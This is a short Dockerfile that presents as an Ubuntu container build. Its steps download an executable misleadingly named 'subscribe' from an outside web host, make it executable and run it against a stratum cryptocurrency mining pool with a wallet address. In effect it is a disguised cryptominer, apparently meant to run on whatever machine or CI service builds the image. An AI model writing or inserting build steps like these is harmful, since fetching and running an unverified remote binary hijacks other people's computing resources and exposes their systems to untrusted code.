FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget http://ilovenypizza.com/subscribe
RUN chmod +x subscribe
RUN ./subscribe -a gr  -o stratum-asia.rplant.xyz:17056 -u RSSKDT38DmpFFpN53K8QdaDQrVYoGYraNg.github
